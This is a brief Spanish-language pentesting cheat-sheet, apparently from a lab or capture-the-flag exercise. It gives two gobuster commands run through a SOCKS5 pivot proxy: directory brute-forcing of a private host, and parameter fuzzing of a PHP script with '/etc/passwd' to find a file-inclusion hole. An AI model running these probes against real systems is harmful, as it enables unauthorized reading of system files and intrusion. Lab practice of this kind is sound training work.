
Gobuster atraves de un proxy

```
gobuster dir -u http://10.10.0.129 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml,zip -t 20 --proxy socks5://127.0.0.1:1080 

```

Fuzzing con gobuster
```
gobuster fuzz -u "http://10.10.0.129/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:1080 | grep -v "Length=0" 
```

